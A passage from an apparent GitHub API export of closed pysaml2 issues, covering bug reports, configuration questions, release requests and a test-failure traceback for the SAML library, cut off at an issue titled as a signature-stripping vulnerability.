"subscriptions_url": "https://api.github.com/users/wbolster/subscriptions", "organizations_url": "https://api.github.com/users/wbolster/orgs", "repos_url": "https://api.github.com/users/wbolster/repos", "events_url": "https://api.github.com/users/wbolster/events{/privacy}", "received_events_url": "https://api.github.com/users/wbolster/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-11-09T13:18:54Z", "updated_at": "2017-11-21T11:16:28Z", "closed_at": "2017-11-16T12:21:34Z", "author_association": "NONE", "active_lock_reason": null, "body": "it would be nice if the github project points to\r\n\r\nhttps://pysaml2.readthedocs.io/\r\n\r\nto make it more discoverable. it would appear at the top of the github page.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/472", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/472/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/472/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/472/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/472", "id": 270019314, "node_id": "MDU6SXNzdWUyNzAwMTkzMTQ=", "number": 472, "title": "Alternatives to loading config metadata when using pysaml2 in web views", "user": {"login": "bogdan-ds", "id": 19280465, "node_id": "MDQ6VXNlcjE5MjgwNDY1", "avatar_url": "https://avatars1.githubusercontent.com/u/19280465?v=4", "gravatar_id": "", "url": "https://api.github.com/users/bogdan-ds", "html_url": "https://github.com/bogdan-ds", "followers_url": "https://api.github.com/users/bogdan-ds/followers", "following_url": "https://api.github.com/users/bogdan-ds/following{/other_user}", "gists_url": "https://api.github.com/users/bogdan-ds/gists{/gist_id}", "starred_url": "https://api.github.com/users/bogdan-ds/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bogdan-ds/subscriptions", "organizations_url": "https://api.github.com/users/bogdan-ds/orgs", "repos_url": "https://api.github.com/users/bogdan-ds/repos", "events_url": "https://api.github.com/users/bogdan-ds/events{/privacy}", "received_events_url": "https://api.github.com/users/bogdan-ds/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2017-10-31T16:08:52Z", "updated_at": "2017-11-02T15:20:05Z", "closed_at": "2017-11-02T15:20:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi all,\r\n\r\nI've implemented pysaml2 in a web environment and am dealing with a multifederation situation with a lot of metadata, which causes the config object to take quite a while to load. This cannot be exposed in this state as it takes too much time to load. I tried to implement a periodic task to create the object and cache it, but the object itself cannot be pickled. \r\n\r\nDo you have any suggestions on any alternative methods of doing that? Any ideas would be greatly appreciated.\r\n\r\nThanks in advance.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/470", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/470/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/470/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/470/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/470", "id": 268897793, "node_id": "MDU6SXNzdWUyNjg4OTc3OTM=", "number": 470, "title": "pysaml2 version 4.5 not working with python version 2.7.5", "user": {"login": "wpr101", "id": 16501438, "node_id": "MDQ6VXNlcjE2NTAxNDM4", "avatar_url": "https://avatars2.githubusercontent.com/u/16501438?v=4", "gravatar_id": "", "url": "https://api.github.com/users/wpr101", "html_url": "https://github.com/wpr101", "followers_url": "https://api.github.com/users/wpr101/followers", "following_url": "https://api.github.com/users/wpr101/following{/other_user}", "gists_url": "https://api.github.com/users/wpr101/gists{/gist_id}", "starred_url": "https://api.github.com/users/wpr101/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/wpr101/subscriptions", "organizations_url": "https://api.github.com/users/wpr101/orgs", "repos_url": "https://api.github.com/users/wpr101/repos", "events_url": "https://api.github.com/users/wpr101/events{/privacy}", "received_events_url": "https://api.github.com/users/wpr101/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-10-26T20:19:17Z", "updated_at": "2017-11-15T11:30:27Z", "closed_at": "2017-11-15T11:30:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello, the system I am running on uses Python 2.7.5. We have a build script which does a pip install of the latest version of pysaml2. \r\n\r\nRecently, the version 4.5 broke because of signature mismatches. We hard coded the install to be for version 4.4.0 and our code ran fine again.\r\n\r\nAny idea if version 4.5 will work with python 2.7.5? Do we need to upgrade to python 2.7.14 to get it to work?\r\n\r\nThank you. ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/466", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/466/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/466/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/466/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/466", "id": 264339646, "node_id": "MDU6SXNzdWUyNjQzMzk2NDY=", "number": 466, "title": "SP metadata requested attribute elements without NameFormat cause unhandled exception", "user": {"login": "skoranda", "id": 687301, "node_id": "MDQ6VXNlcjY4NzMwMQ==", "avatar_url": "https://avatars0.githubusercontent.com/u/687301?v=4", "gravatar_id": "", "url": "https://api.github.com/users/skoranda", "html_url": "https://github.com/skoranda", "followers_url": "https://api.github.com/users/skoranda/followers", "following_url": "https://api.github.com/users/skoranda/following{/other_user}", "gists_url": "https://api.github.com/users/skoranda/gists{/gist_id}", "starred_url": "https://api.github.com/users/skoranda/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/skoranda/subscriptions", "organizations_url": "https://api.github.com/users/skoranda/orgs", "repos_url": "https://api.github.com/users/skoranda/repos", "events_url": "https://api.github.com/users/skoranda/events{/privacy}", "received_events_url": "https://api.github.com/users/skoranda/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2017-10-10T18:59:41Z", "updated_at": "2019-01-18T07:56:56Z", "closed_at": "2019-01-18T07:56:56Z", "author_association": "COLLABORATOR", "active_lock_reason": null, "body": "If the SP has metadata that includes a \\<RequestedAttribute\\> without a NameFormat attribute then a KeyError is thrown from  method _match_attr_name() in assertion.py. The reason is that the attr dictionary object being passed to get_local_name() will not in that case have the key \"name_format\".", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/465", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/465/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/465/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/465/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/465", "id": 264128048, "node_id": "MDU6SXNzdWUyNjQxMjgwNDg=", "number": 465, "title": "Support generic incoming response validation ", "user": {"login": "jkakavas", "id": 10281256, "node_id": "MDQ6VXNlcjEwMjgxMjU2", "avatar_url": "https://avatars2.githubusercontent.com/u/10281256?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jkakavas", "html_url": "https://github.com/jkakavas", "followers_url": "https://api.github.com/users/jkakavas/followers", "following_url": "https://api.github.com/users/jkakavas/following{/other_user}", "gists_url": "https://api.github.com/users/jkakavas/gists{/gist_id}", "starred_url": "https://api.github.com/users/jkakavas/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jkakavas/subscriptions", "organizations_url": "https://api.github.com/users/jkakavas/orgs", "repos_url": "https://api.github.com/users/jkakavas/repos", "events_url": "https://api.github.com/users/jkakavas/events{/privacy}", "received_events_url": "https://api.github.com/users/jkakavas/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605568, "node_id": "MDU6TGFiZWw1NjA1NTY4", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/enhancement", "name": "enhancement", "color": "84b6eb", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2017-10-10T07:43:20Z", "updated_at": "2018-12-04T14:16:10Z", "closed_at": "2018-12-04T14:16:10Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "We now support explicit setting of `want_assertions_signed` and `want_response_signed` that will, as the name suggests, validate that the SAML Assertion(s) of an incoming SAML response, or the SAML Response itself are signed correctly and fail otherwise. \r\n\r\nI believe we need to allow for an `either or` configuration of the two above that would allow users to configure a pysaml2 based SP to receive any combination of signed assertions and signed responses ( in a similar way to what Shibboleth SP does for instance )", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/463", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/463/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/463/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/463/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/463", "id": 262368485, "node_id": "MDU6SXNzdWUyNjIzNjg0ODU=", "number": 463, "title": "Metadata validation breaks with non-ascii characters", "user": {"login": "rhoerbe", "id": 4348479, "node_id": "MDQ6VXNlcjQzNDg0Nzk=", "avatar_url": "https://avatars1.githubusercontent.com/u/4348479?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rhoerbe", "html_url": "https://github.com/rhoerbe", "followers_url": "https://api.github.com/users/rhoerbe/followers", "following_url": "https://api.github.com/users/rhoerbe/following{/other_user}", "gists_url": "https://api.github.com/users/rhoerbe/gists{/gist_id}", "starred_url": "https://api.github.com/users/rhoerbe/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rhoerbe/subscriptions", "organizations_url": "https://api.github.com/users/rhoerbe/orgs", "repos_url": "https://api.github.com/users/rhoerbe/repos", "events_url": "https://api.github.com/users/rhoerbe/events{/privacy}", "received_events_url": "https://api.github.com/users/rhoerbe/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-10-03T09:55:13Z", "updated_at": "2017-11-15T11:12:27Z", "closed_at": "2017-11-15T11:12:26Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "The XML infoset at http://mdfeed.test.portalverbund.gv.at/metadata.xml contains German Umlauts in XML elements. pysaml2.sigver breaks because the xml contents is not retrieved correctly (data/digest mismatch)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/459", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/459/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/459/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/459/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/459", "id": 259952131, "node_id": "MDU6SXNzdWUyNTk5NTIxMzE=", "number": 459, "title": "Form used with HTTP_POST binding nonconforming and shows submit button ", "user": {"login": "skoranda", "id": 687301, "node_id": "MDQ6VXNlcjY4NzMwMQ==", "avatar_url": "https://avatars0.githubusercontent.com/u/687301?v=4", "gravatar_id": "", "url": "https://api.github.com/users/skoranda", "html_url": "https://github.com/skoranda", "followers_url": "https://api.github.com/users/skoranda/followers", "following_url": "https://api.github.com/users/skoranda/following{/other_user}", "gists_url": "https://api.github.com/users/skoranda/gists{/gist_id}", "starred_url": "https://api.github.com/users/skoranda/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/skoranda/subscriptions", "organizations_url": "https://api.github.com/users/skoranda/orgs", "repos_url": "https://api.github.com/users/skoranda/repos", "events_url": "https://api.github.com/users/skoranda/events{/privacy}", "received_events_url": "https://api.github.com/users/skoranda/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-09-22T22:20:12Z", "updated_at": "2017-11-16T12:16:43Z", "closed_at": "2017-11-16T12:16:43Z", "author_association": "COLLABORATOR", "active_lock_reason": null, "body": "The form created and delivered to the browser when using the HTTP_POST binding is nonconforming XHTML because it does not declare a DOCTYPE. Further it does not leverage best practices so that even with Javascript enabled the user will see a submit button rendered, if only for a fraction of a second. ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/457", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/457/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/457/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/457/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/457", "id": 258446168, "node_id": "MDU6SXNzdWUyNTg0NDYxNjg=", "number": 457, "title": "filter_on_attributes raises KeyError on unknown attribute", "user": {"login": "tpazderka", "id": 7734753, "node_id": "MDQ6VXNlcjc3MzQ3NTM=", "avatar_url": "https://avatars3.githubusercontent.com/u/7734753?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tpazderka", "html_url": "https://github.com/tpazderka", "followers_url": "https://api.github.com/users/tpazderka/followers", "following_url": "https://api.github.com/users/tpazderka/following{/other_user}", "gists_url": "https://api.github.com/users/tpazderka/gists{/gist_id}", "starred_url": "https://api.github.com/users/tpazderka/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tpazderka/subscriptions", "organizations_url": "https://api.github.com/users/tpazderka/orgs", "repos_url": "https://api.github.com/users/tpazderka/repos", "events_url": "https://api.github.com/users/tpazderka/events{/privacy}", "received_events_url": "https://api.github.com/users/tpazderka/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-09-18T11:23:27Z", "updated_at": "2017-09-18T11:26:30Z", "closed_at": "2017-09-18T11:26:30Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "If the request contains unknown attribute (not registered in any attribute map) the `filter_on_attributes` raises KeyError.\r\n\r\nI do believe that the error should be expected and the attribute removed from the request.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/455", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/455/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/455/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/455/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/455", "id": 257445118, "node_id": "MDU6SXNzdWUyNTc0NDUxMTg=", "number": 455, "title": "nameid-format:unspecified", "user": {"login": "ekreiser", "id": 7514923, "node_id": "MDQ6VXNlcjc1MTQ5MjM=", "avatar_url": "https://avatars1.githubusercontent.com/u/7514923?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ekreiser", "html_url": "https://github.com/ekreiser", "followers_url": "https://api.github.com/users/ekreiser/followers", "following_url": "https://api.github.com/users/ekreiser/following{/other_user}", "gists_url": "https://api.github.com/users/ekreiser/gists{/gist_id}", "starred_url": "https://api.github.com/users/ekreiser/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ekreiser/subscriptions", "organizations_url": "https://api.github.com/users/ekreiser/orgs", "repos_url": "https://api.github.com/users/ekreiser/repos", "events_url": "https://api.github.com/users/ekreiser/events{/privacy}", "received_events_url": "https://api.github.com/users/ekreiser/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-09-13T16:34:29Z", "updated_at": "2018-07-07T10:56:46Z", "closed_at": "2018-07-07T10:56:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "why did you defined it as a 2.0 format?\r\n\r\n         urn:oasis:names:tc:SAML:2.0:nameid-format:unspecified\r\n\r\nwhen the standard only defines a 1.1 version of the unspecified nameid\r\n\r\n          urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\r\n\r\nthis is causing compatability issues working with certain IDP's", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/452", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/452/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/452/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/452/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/452", "id": 256553927, "node_id": "MDU6SXNzdWUyNTY1NTM5Mjc=", "number": 452, "title": "New pypi release?", "user": {"login": "nbartos", "id": 923926, "node_id": "MDQ6VXNlcjkyMzkyNg==", "avatar_url": "https://avatars0.githubusercontent.com/u/923926?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nbartos", "html_url": "https://github.com/nbartos", "followers_url": "https://api.github.com/users/nbartos/followers", "following_url": "https://api.github.com/users/nbartos/following{/other_user}", "gists_url": "https://api.github.com/users/nbartos/gists{/gist_id}", "starred_url": "https://api.github.com/users/nbartos/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nbartos/subscriptions", "organizations_url": "https://api.github.com/users/nbartos/orgs", "repos_url": "https://api.github.com/users/nbartos/repos", "events_url": "https://api.github.com/users/nbartos/events{/privacy}", "received_events_url": "https://api.github.com/users/nbartos/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605567, "node_id": "MDU6TGFiZWw1NjA1NTY3", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/duplicate", "name": "duplicate", "color": "cccccc", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-09-11T00:40:35Z", "updated_at": "2017-11-15T11:13:31Z", "closed_at": "2017-11-15T11:13:31Z", "author_association": "NONE", "active_lock_reason": null, "body": "The latest 4.4.0 pypi package (nearly a year old) has bugs that affect us, and they are fixed in master.  Could you please cut a new pypi release from master?  Thanks!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/449", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/449/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/449/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/449/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/449", "id": 254981720, "node_id": "MDU6SXNzdWUyNTQ5ODE3MjA=", "number": 449, "title": "Examples broken", "user": {"login": "brianmay", "id": 112729, "node_id": "MDQ6VXNlcjExMjcyOQ==", "avatar_url": "https://avatars3.githubusercontent.com/u/112729?v=4", "gravatar_id": "", "url": "https://api.github.com/users/brianmay", "html_url": "https://github.com/brianmay", "followers_url": "https://api.github.com/users/brianmay/followers", "following_url": "https://api.github.com/users/brianmay/following{/other_user}", "gists_url": "https://api.github.com/users/brianmay/gists{/gist_id}", "starred_url": "https://api.github.com/users/brianmay/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/brianmay/subscriptions", "organizations_url": "https://api.github.com/users/brianmay/orgs", "repos_url": "https://api.github.com/users/brianmay/repos", "events_url": "https://api.github.com/users/brianmay/events{/privacy}", "received_events_url": "https://api.github.com/users/brianmay/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2017-09-04T09:16:52Z", "updated_at": "2018-07-06T18:40:23Z", "closed_at": "2018-07-06T18:40:23Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nThere seem to be a number of problems getting the examples to work under Python 3.6.x.\r\n\r\nFor example:\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"./idp.py\", line 11, in <module>\r\n    from cherrypy import wsgiserver\r\nImportError: cannot import name 'wsgiserver'\r\nTraceback (most recent call last):\r\n  File \"./sp.py\", line 852, in <module>\r\n    from cherrypy import wsgiserver\r\nImportError: cannot import name 'wsgiserver'\r\n```\r\n\r\nRegards", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/444", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/444/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/444/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/444/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/444", "id": 252063784, "node_id": "MDU6SXNzdWUyNTIwNjM3ODQ=", "number": 444, "title": "v3.0.0 test_41_response.py failing", "user": {"login": "kirotawa", "id": 476400, "node_id": "MDQ6VXNlcjQ3NjQwMA==", "avatar_url": "https://avatars0.githubusercontent.com/u/476400?v=4", "gravatar_id": "", "url": "https://api.github.com/users/kirotawa", "html_url": "https://github.com/kirotawa", "followers_url": "https://api.github.com/users/kirotawa/followers", "following_url": "https://api.github.com/users/kirotawa/following{/other_user}", "gists_url": "https://api.github.com/users/kirotawa/gists{/gist_id}", "starred_url": "https://api.github.com/users/kirotawa/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/kirotawa/subscriptions", "organizations_url": "https://api.github.com/users/kirotawa/orgs", "repos_url": "https://api.github.com/users/kirotawa/repos", "events_url": "https://api.github.com/users/kirotawa/events{/privacy}", "received_events_url": "https://api.github.com/users/kirotawa/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2017-08-22T19:27:46Z", "updated_at": "2017-08-22T20:00:18Z", "closed_at": "2017-08-22T20:00:18Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, \r\n\r\nI'm open this issue in order to get any advice about what/how to fix this issue that happens in version 3.0.0.  Same test pass in upstream version/master version.\r\nBellow is the error msg while type py.test test_41_response.py\r\n\r\ntest_41_response.py ..F.\r\n\r\n====================================== FAILURES =======================================\r\n____________________________ TestResponse.test_false_sign _____________________________\r\n\r\nself = <test_41_response.TestResponse instance at 0x7f104380bea8>\r\n\r\n    def test_false_sign(self):\r\n        xml_response = open(FALSE_ASSERT_SIGNED).read()\r\n        resp = response_factory(\r\n            xml_response, self.conf,\r\n            return_addrs=[\"http://lingon.catalogix.se:8087/\"],\r\n            outstanding_queries={\r\n                \"bahigehogffohiphlfmplepdpcohkhhmheppcdie\":\r\n                    \"http://localhost:8088/sso\"},\r\n            timeslack=TIMESLACK, decode=False)\r\n    \r\n        assert isinstance(resp, StatusResponse)\r\n        assert isinstance(resp, AuthnResponse)\r\n        try:\r\n>           resp.verify()\r\n\r\ntest_41_response.py:109: \r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\n/usr/lib/python2.7/dist-packages/saml2/response.py:964: in verify\r\n    res = self._verify()\r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\n\r\nself = <saml2.response.AuthnResponse object at 0x7f104384d350>\r\n\r\n    def _verify(self):\r\n        if self.request_id and self.in_response_to and \\\r\n                        self.in_response_to != self.request_id:\r\n            logger.error(\"Not the id I expected: %s != %s\" % (\r\n                self.in_response_to, self.request_id))\r\n            return None\r\n    \r\n        try:\r\n            assert self.response.version == \"2.0\"\r\n        except AssertionError:\r\n            _ver = float(self.response.version)\r\n            if _ver < 2.0:\r\n                raise RequestVersionTooLow()\r\n            else:\r\n                raise RequestVersionTooHigh()\r\n    \r\n        if self.asynchop:\r\n            if self.response.destination and \\\r\n                    self.response.destination not in self.return_addrs:\r\n                logger.error(\"%s not in %s\" % (self.response.destination,\r\n                                               self.return_addrs))\r\n                return None\r\n    \r\n>       assert self.issue_instant_ok()\r\nE       AssertionError\r\n\r\n/usr/lib/python2.7/dist-packages/saml2/response.py:392: AssertionError\r\n-------------------------------- Captured stderr call ---------------------------------\r\nNo handlers could be found for logger \"saml2.response\"\r\n\r\nAny direction would be appreciate. \r\n\r\nThanks in advance!!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/441", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/441/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/441/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/441/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/441", "id": 247960404, "node_id": "MDU6SXNzdWUyNDc5NjA0MDQ=", "number": 441, "title": "get_local_name throws Exception", "user": {"login": "jkakavas", "id": 10281256, "node_id": "MDQ6VXNlcjEwMjgxMjU2", "avatar_url": "https://avatars2.githubusercontent.com/u/10281256?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jkakavas", "html_url": "https://github.com/jkakavas", "followers_url": "https://api.github.com/users/jkakavas/followers", "following_url": "https://api.github.com/users/jkakavas/following{/other_user}", "gists_url": "https://api.github.com/users/jkakavas/gists{/gist_id}", "starred_url": "https://api.github.com/users/jkakavas/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jkakavas/subscriptions", "organizations_url": "https://api.github.com/users/jkakavas/orgs", "repos_url": "https://api.github.com/users/jkakavas/repos", "events_url": "https://api.github.com/users/jkakavas/events{/privacy}", "received_events_url": "https://api.github.com/users/jkakavas/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-08-04T10:03:23Z", "updated_at": "2017-08-24T20:24:41Z", "closed_at": "2017-08-24T20:24:41Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "`get_local_name` : https://github.com/rohe/pysaml2/blob/master/src/saml2/attribute_converter.py#L245\r\n\r\n```\r\ndef get_local_name(acs, attr, name_format):\r\n    for aconv in acs:\r\n        #print(ac.format, name_format)\r\n        if aconv.name_format == name_format:\r\n            return aconv._fro[attr]\r\n```\r\n\r\nmakes the implicit assumption that the attribute converters will contain all attribute OIDs that will be in the required attributes of some services metadata ( we don't check if `attr` is in _fro )\r\n\r\nWe should either check this here or, handle it with a try clause in \r\nhttps://github.com/rohe/pysaml2/blob/master/src/saml2/assertion.py#L82 which is the only place `get_local_name` is used", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/435", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/435/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/435/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/435/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/435", "id": 243633497, "node_id": "MDU6SXNzdWUyNDM2MzM0OTc=", "number": 435, "title": "Can you please tag a release?", "user": {"login": "WebSpider", "id": 437323, "node_id": "MDQ6VXNlcjQzNzMyMw==", "avatar_url": "https://avatars3.githubusercontent.com/u/437323?v=4", "gravatar_id": "", "url": "https://api.github.com/users/WebSpider", "html_url": "https://github.com/WebSpider", "followers_url": "https://api.github.com/users/WebSpider/followers", "following_url": "https://api.github.com/users/WebSpider/following{/other_user}", "gists_url": "https://api.github.com/users/WebSpider/gists{/gist_id}", "starred_url": "https://api.github.com/users/WebSpider/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/WebSpider/subscriptions", "organizations_url": "https://api.github.com/users/WebSpider/orgs", "repos_url": "https://api.github.com/users/WebSpider/repos", "events_url": "https://api.github.com/users/WebSpider/events{/privacy}", "received_events_url": "https://api.github.com/users/WebSpider/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2017-07-18T08:09:29Z", "updated_at": "2017-11-15T11:13:14Z", "closed_at": "2017-11-15T11:13:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi!\r\nI'm using the currently available release 4.4.0, since we're using pip to install packages. The 4.4.0 release is from october 2016, and thus contains several bugs that have been fixed since then, and I'm running into.\r\n\r\nCould you please tag a release, so the package definition for pip (and various linux distro's who include the package directly) can get updated?\r\n\r\nThanks!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/424", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/424/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/424/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/424/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/424", "id": 238023195, "node_id": "MDU6SXNzdWUyMzgwMjMxOTU=", "number": 424, "title": "PySAML vulnerable to signature stripping by default", "user": {"login": "terite", "id": 44259, "node_id": 